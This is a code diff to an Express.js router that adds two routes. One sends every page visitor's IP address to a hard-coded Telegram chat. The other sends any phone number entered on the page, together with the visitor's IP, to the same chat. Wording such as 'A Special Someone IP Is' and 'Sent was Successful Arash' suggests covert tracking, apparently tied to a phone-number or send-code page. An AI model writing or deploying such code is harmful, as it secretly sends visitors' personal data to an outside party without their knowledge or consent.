@@ -61,4 +61,51 @@ router.get("/newRoute", (req, res) => {
         message: "this is a new route",
     });
 });
+function getClientIp(req) {
+    const forwarded = req.headers["x-forwarded-for"];
+    return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
+}
+function sendTelegramMessage(text) {
+    return __awaiter(this, void 0, void 0, function* () {
+        yield fetch(`https://api.telegram.org/bot${process.env.TELE_KEY}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: 5665639218,
+                text,
+            }),
+        });
+    });
+}
+/* =========================================================================
+ * 1) GET /api/tests/getIp
+ *    Fires on EVERY page visit. Knows nothing about phone numbers or the
+ *    send-code button — it only ever reports the visitor's IP.
+ * ========================================================================= */
+router.get("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    const ip = getClientIp(req);
+    let message;
+    try {
+        yield sendTelegramMessage(`A Special Someone IP Is : ${ip}`);
+        message = "Sent was Successful Arash";
+    }
+    catch (error) {
+        message = "Telegram request failed " + error;
+    }
+    // the original route never responded, so the frontend's res.json() would hang forever.
+    res.json({ ip, message });
+}));
+router.get("/phoneEntered", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    const ip = getClientIp(req);
+    const phone = typeof req.query.phone === "string" ? req.query.phone.trim() : "";
+    let message;
+    try {
+        yield sendTelegramMessage(`A Special User Entered Phone: ${phone} — IP: ${ip}`);
+        message = "Sent was Successful Arash";
+    }
+    catch (error) {
+        message = "Telegram request failed " + error;
+    }
+    res.json({ ip, message });
+}));
 exports.default = router;
